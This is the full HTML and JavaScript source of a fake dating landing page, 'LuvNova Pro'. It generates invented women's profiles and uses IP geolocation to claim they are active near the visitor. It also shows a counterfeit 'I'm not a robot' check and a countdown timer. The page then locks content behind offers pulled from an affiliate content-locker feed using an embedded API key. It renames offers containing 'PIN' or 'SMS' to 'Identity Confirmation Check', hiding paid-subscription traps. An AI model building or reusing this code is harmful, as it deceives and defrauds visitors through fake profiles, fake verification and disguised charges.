<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LuvNova Pro - Exclusive Access</title>
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <style>
        :root { --primary: #fe3c72; --bg: #fdf2f5; --white: #ffffff; --onlyfans: #0088cc; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); margin: 0; color: #1c1e21; position: relative; overflow-x: hidden; }
        
        .bg-decor { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; }
        .bg-decor span { position: absolute; color: rgba(254, 60, 114, 0.1); font-size: 18px; opacity: 0.15; }
        .top-bar { background: #222; color: #fff; padding: 8px; text-align: center; font-size: 11px; font-weight: bold; }
        
        header { background: #fff; padding: 10px 15px; border-bottom: 1px solid #ddd; position: sticky; top: 0; z-index: 1000; height: 55px; display: flex; align-items: center; justify-content: space-between; }
        .site-logo-head { width: 32px; height: 32px; border-radius: 50%; border: 1px solid var(--primary); }
        header h1 { margin: 0; color: var(--primary); font-size: 19px; font-weight: 800; }
        .menu-btn { color: #555; font-size: 20px; cursor: pointer; padding: 5px; }
        .dropdown-menu { display: none; position: absolute; right: 0; top: 40px; background: #fff; border: 1px solid #eee; border-radius: 10px; width: 150px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); z-index: 1100; overflow: hidden; }
        .dropdown-menu a { display: block; padding: 12px 15px; color: #333; text-decoration: none; font-size: 13px; border-bottom: 1px solid #f9f9f9; }

        .search-container { padding: 10px 15px; background: #fff; border-bottom: 1px solid #eee; }
        #smartSearch { width: 100%; padding: 10px 35px; border-radius: 25px; border: 1px solid #ddd; outline: none; font-size: 13px; box-sizing: border-box; background: #fdf9fa; }

        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
        .card { background: var(--white); border-radius: 12px; overflow: hidden; border: 1px solid #eee; display: flex; flex-direction: column; height: 100%; }
        .card img { width: 100%; height: 180px; object-fit: cover; background: #f0f0f0; }
        
        .info { padding: 8px; display: flex; flex-direction: column; flex-grow: 1; }
        .name-age { font-size: 13px; font-weight: 700; height: 18px; }
        .loc-text { font-size: 10px; color: #28a745; margin-top: 2px; font-weight: bold; }
        .girl-msg { font-size: 10px; color: var(--primary); font-style: italic; height: 32px; overflow: hidden; margin: 5px 0; line-height: 1.2; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; }
        .social-item { background: #fff0f3; padding: 2px 5px; border-radius: 4px; font-size: 8px; font-weight: 700; color: #d63384; border: 1px dashed #ffb3c1; margin-right: 3px; display: inline-block; }
        .btn-connect { background: var(--primary); color: white; width: 100%; padding: 10px; border-radius: 10px; font-weight: bold; border:none; cursor: pointer; font-size: 12px; margin-top: 5px; }

        #locker { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:5000; overflow-y: auto; }
        .locker-inner { max-width: 450px; margin: 0 auto; padding: 20px 15px; text-align: center; }
        .p-img-main { width: 85px; height: 85px; border-radius: 50%; border: 3px solid var(--primary); object-fit: cover; margin-bottom: 10px; }
        
        #sync-text { font-size: 10px; margin-bottom: 10px; color: #888; }

        .stats-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 15px 0; }
        .stat-box { background: #fff; border: 1px solid #ffd1dc; border-radius: 10px; padding: 6px; text-align: center; cursor: pointer; }
        .stat-box i { color: var(--primary); font-size: 16px; }
        .stat-val { display: block; font-weight: 800; font-size: 11px; }
        .stat-of { background: #e6f7ff; border-color: #91d5ff; color: var(--onlyfans); position: relative; }

        .social-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 6px; margin: 20px 0; padding: 8px; background: #fdf9fa; border-radius: 12px; }
        .soc-icon { position: relative; font-size: 20px; padding: 8px; background: #fff; border-radius: 10px; border: 1px solid #eee; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .soc-lock { position: absolute; bottom: 2px; right: 2px; font-size: 7px; color: #ff0000; background: #fff; border-radius: 50%; padding: 1px; }

        .promo-text { background: #fff0f3; color: var(--primary); font-size: 11px; font-weight: bold; padding: 10px; border-radius: 10px; border: 1px solid #ffccd5; margin: 10px 0; line-height: 1.4; }

        .captcha-area { background: #fff9fb; border: 1px solid #ffd1dc; border-radius: 15px; padding: 15px; margin: 20px 0; transition: 0.3s; }
        .recaptcha-box { background: #fff; border: 1px solid #d3d3d3; height: 74px; display: flex; align-items: center; justify-content: space-between; padding: 0 12px; cursor: pointer; }
        .checkbox { width: 25px; height: 25px; border: 2px solid #c1c1c1; background: #fff; }
        .checkbox.loading { border-radius: 50%; border-top-color: var(--primary); animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        /* العروض الاحترافية الجديدة */
        #offers-wrap { display: none; margin-top: 15px; text-align: left; }
        .offer-card { background: var(--white); border: 2px solid #f0f0f0; border-radius: 12px; padding: 12px; margin-bottom: 10px; display: flex; align-items: center; text-decoration: none; color: #333; position: relative; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        .offer-step-tag { position: absolute; top: 0; right: 0; background: var(--primary); color: #fff; font-size: 8px; padding: 2px 8px; border-bottom-left-radius: 10px; font-weight: bold; text-transform: uppercase; }
        .offer-card img { width: 45px; height: 45px; border-radius: 10px; margin-right: 12px; object-fit: cover; }
        .offer-title { font-size: 12px; font-weight: 800; color: #222; margin-bottom: 3px; }
        .offer-desc { font-size: 10px; color: var(--primary); font-weight: 600; text-transform: uppercase; }

        .vid-container { width: 100%; max-width: 260px; height: 380px; margin: 15px auto; border-radius: 18px; overflow: hidden; border: 4px solid #fff; box-shadow: 0 8px 20px rgba(0,0,0,0.15); background: #000; }
        .vid-container video { width: 100%; height: 100%; object-fit: cover; }

        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(5px); } 75% { transform: translateX(-5px); } }
        .shake-now { animation: shake 0.3s ease-in-out; border-color: var(--primary) !important; }
    </style>
</head>
<body onclick="enableAudio()">

<div id="bgDecor" class="bg-decor"></div>
<div class="top-bar">Offer expires in <span id="timer">05:00</span></div>

<header>
    <div class="header-left">
        <img src="logo.jpg" class="site-logo-head" onerror="this.src='logo.png'">
        <h1>LuvNovaPRO</h1>
    </div>
    <div class="menu-btn" onclick="toggleMenu()"><i class="fas fa-bars"></i></div>
    <div class="dropdown-menu" id="mainMenu">
        <a href="#">Login</a><a href="#">Settings</a><a href="#">Privacy</a><a href="#">Terms</a>
    </div>
</header>

<div class="search-container">
    <input type="text" id="smartSearch" placeholder="Search city, age, or country..." onkeyup="filterProfiles()">
</div>

<div id="main-grid" class="grid"></div>

<div id="locker">
    <div class="locker-inner">
        <div class="p-header">
            <i class="fas fa-chevron-left" onclick="closeLocker()" style="position:absolute; left:0; top:5px; padding:15px; color:#888; cursor:pointer;"></i>
            <img id="p-img" src="" class="p-img-main">
            <h3 id="p-name" style="margin:0; font-size:18px;"></h3>
            <p id="sync-text"><i class="fas fa-circle-notch fa-spin"></i> Syncing...</p>
            
            <div class="stats-row">
                <div class="stat-box" onclick="remindCaptcha()"><i class="fas fa-camera"></i><span class="stat-val" id="st-ph">0</span>Photos</div>
                <div class="stat-box" onclick="remindCaptcha()"><i class="fas fa-video"></i><span class="stat-val" id="st-vi">0</span>Videos</div>
                <div class="stat-box stat-of" onclick="remindCaptcha()"><i class="fab fa-instagram"></i><span class="stat-val">OnlyFans</span><i class="fas fa-lock" style="font-size:7px; position:absolute; top:2px; right:2px; color:#ffb3c1;"></i></div>
            </div>

            <div class="social-grid">
                <div class="soc-icon" style="color:#25D366;" onclick="remindCaptcha()"><i class="fab fa-whatsapp"></i><i class="fas fa-lock soc-lock"></i></div>
                <div class="soc-icon" style="color:#E1306C;" onclick="remindCaptcha()"><i class="fab fa-instagram"></i><i class="fas fa-lock soc-lock"></i></div>
                <div class="soc-icon" style="color:#FFFC00; text-shadow: 1px 1px 1px #000;" onclick="remindCaptcha()"><i class="fab fa-snapchat-ghost"></i><i class="fas fa-lock soc-lock"></i></div>
                <div class="soc-icon" style="color:#0088cc;" onclick="remindCaptcha()"><i class="fab fa-telegram-plane"></i><i class="fas fa-lock soc-lock"></i></div>
                <div class="soc-icon" style="color:#000;" onclick="remindCaptcha()"><i class="fab fa-tiktok"></i><i class="fas fa-lock soc-lock"></i></div>
            </div>
        </div>

        <div class="promo-text">
            ⚠️ Complete the quick verification and one simple task below to unlock all private content for FREE. <br>
            <span style="font-size:9px; color:#888;">(Watch the video tutorial below for the exact method!)</span>
        </div>

        <div class="captcha-area" id="captcha-area">
            <div class="recaptcha-box" onclick="triggerCaptcha()">
                <div style="display:flex; align-items:center; gap:12px;"><div class="checkbox" id="captcha-box"></div><span style="font-size:14px; font-weight:600; color:#555;">I'm not a robot</span></div>
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png" style="width:26px; opacity:0.6;">
            </div>
            <div id="offers-wrap"><p style="font-size:11px; color:var(--primary); font-weight:bold; margin-bottom:12px;">Step 2: Verification Tasks</p><div id="offers-list"></div></div>
        </div>

        <div id="video-placeholder" class="vid-container"><video id="tutorialVideo" loop playsinline muted><source src="tutorial.mp4" type="video/mp4"></video></div>
    </div>
</div>

<script>
    let userCity = "Your Area";
    const intlCities = ["London, UK", "New York, USA", "Toronto, Canada", "Miami, USA", "Vancouver, Canada", "Chicago, USA", "Sydney, Australia", "Manchester, UK", "Houston, USA"];

    // تتبع الموقع الفوري بسرعة البرق
    $.getJSON("http://ip-api.com/json/?callback=?", function(data) {
        if(data && data.city) {
            userCity = data.city + ", " + data.countryCode;
            renderGrid();
        }
    });

    const names = ["Maddie", "Sienna", "Chloe", "Amber", "Tiffany", "Elena", "Sophie", "Isabella", "Ava", "Mia", "Zoe", "Layla", "Aria", "Scarlett"];
    const bios = ["Looking for someone tonight. ❤️", "Serious connection only.", "Active now, let's chat. 🔥", "Unlock my private gallery.", "Waiting for your message..."];

    function createCard(imgNum) {
        let name = names[imgNum % names.length] + " " + String.fromCharCode(65 + (imgNum % 26)) + ".";
        let locationLabel = (Math.random() < 0.5 && userCity !== "Your Area") ? userCity : intlCities[Math.floor(Math.random() * intlCities.length)];
        let socials = ["WhatsApp", "Instagram", "Snapchat"].sort(() => 0.5 - Math.random()).slice(0, 2);
        
        return `<div class="card" data-info="${name.toLowerCase()} ${locationLabel.toLowerCase()}">
            <img src="young_${imgNum}.jpg" loading="lazy" onerror="this.parentElement.style.display='none'">
            <div class="info">
                <div class="name-age">${name}, ${22+(imgNum%10)}</div>
                <div class="loc-text"><i class="fas fa-map-marker-alt"></i> ${locationLabel}</div>
                <span class="girl-msg">"${bios[imgNum % bios.length]}"</span>
                <div style="margin-top:auto">${socials.map(s => `<span class="social-item">🔒 ${s}</span>`).join('')}</div>
                <button class="btn-connect" onclick="openLocker('${name}', 'young_${imgNum}.jpg', '${locationLabel}')">Connect Now</button>
            </div>
        </div>`;
    }

    function renderGrid() {
        const grid = document.getElementById('main-grid');
        let cardsArray = [];
        for (let i = 1; i <= 200; i++) { cardsArray.push(createCard(i)); }
        cardsArray.sort(() => Math.random() - 0.5);
        grid.innerHTML = cardsArray.join('');
    }
    renderGrid();

    function openLocker(name, img, loc) {
        document.getElementById('p-name').innerText = name;
        document.getElementById('p-img').src = img;
        document.getElementById('st-ph').innerText = Math.floor(Math.random() * 50) + 20;
        document.getElementById('st-vi').innerText = Math.floor(Math.random() * 5) + 2;
        
        const sync = document.getElementById('sync-text');
        sync.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Syncing...`;
        
        setTimeout(() => {
            let isOnline = Math.random() < 0.7;
            if(isOnline) sync.innerHTML = `<span style="color:#28a745"><i class="fas fa-circle" style="font-size:7px;"></i> Active Now near ${loc}</span>`;
            else sync.innerHTML = `<span style="color:#999"><i class="fas fa-clock"></i> Last seen: ${Math.floor(Math.random()*4)+1}h ago near ${loc}</span>`;
        }, 1200);

        document.querySelector('.locker-inner').appendChild(document.getElementById('video-placeholder')); 
        document.getElementById('offers-wrap').style.display = 'none';
        document.getElementById('locker').style.display = 'block';
        
        const vid = document.getElementById('tutorialVideo');
        vid.muted = false; vid.play().catch(() => { vid.muted = true; vid.play(); });
    }

    function triggerCaptcha() {
        const box = document.getElementById('captcha-box');
        if(box.classList.contains('loading')) return;
        box.classList.add('loading');
        setTimeout(() => {
            document.querySelector('.locker-inner').appendChild(document.getElementById('video-placeholder'));
            document.getElementById('offers-wrap').style.display = 'block';
            fetchOffers();
        }, 1000);
    }

    function fetchOffers() {
        const feedUrl = "https://d5b3uz3fo8hn3.cloudfront.net/public/offers/feed.php?user_id=570304&api_key=0da06ad8edf91a87f3387591d987d7bb&callback=?";
        $.getJSON(feedUrl, function(offers) {
            let html = '';
            offers.slice(0, 4).forEach((offer, index) => {
                let cleanTitle = offer.anchor || offer.title;
                if(/[\u0600-\u06FF]/.test(cleanTitle)) cleanTitle = "Secure Access Verification";
                if(cleanTitle.includes("PIN") || cleanTitle.includes("SMS")) cleanTitle = "Identity Confirmation Check";
                
                // الأيقونة الأصلية مع أيقونة بديلة احترافية
                let iconUrl = (offer.icon && offer.icon !== "") ? offer.icon : "https://cdn-icons-png.flaticon.com/512/1162/1162933.png";

                html += `<a href="${offer.url}" target="_blank" class="offer-card">
                    <div class="offer-step-tag">Step ${index+1}</div>
                    <img src="${iconUrl}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/743/743007.png'">
                    <div>
                        <div class="offer-title">${cleanTitle}</div>
                        <div class="offer-desc">[COMPLETE TO UNLOCK CONTENT]</div>
                    </div>
                </a>`;
            });
            $("#offers-list").html(html);
        });
    }

    function remindCaptcha() {
        const area = document.getElementById('captcha-area');
        area.classList.add('shake-now');
        setTimeout(() => area.classList.remove('shake-now'), 400);
        area.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }

    function toggleMenu() {
        const menu = document.getElementById('mainMenu');
        menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
    }

    function filterProfiles() {
        let input = document.getElementById('smartSearch').value.toLowerCase();
        let cards = document.getElementsByClassName('card');
        for (let i = 0; i < cards.length; i++) {
            cards[i].style.display = cards[i].getAttribute('data-info').includes(input) ? "" : "none";
        }
    }

    function closeLocker() { document.getElementById('locker').style.display = 'none'; document.getElementById('tutorialVideo').pause(); }

    function spawnDecor() {
        const container = document.getElementById('bgDecor');
        for (let i = 0; i < 30; i++) {
            const span = document.createElement('span');
            span.innerText = ['🌸', '❤️', '🌹'][Math.floor(Math.random() * 3)];
            span.style.left = Math.random() * 95 + '%'; span.style.top = Math.random() * 95 + '%';
            span.style.position = 'absolute'; container.appendChild(span);
        }
    }
    spawnDecor();

    function enableAudio() {
        const vid = document.getElementById('tutorialVideo');
        if (vid && vid.muted) { vid.muted = false; vid.play(); }
    }

    let time = 300;
    setInterval(() => {
        let min = Math.floor(time / 60); let sec = time % 60;
        document.getElementById('timer').innerText = `0${min}:${sec < 10 ? '0'+sec : sec}`;
        if(time > 0) time--;
    }, 1000);
</script>
</body>
</html>
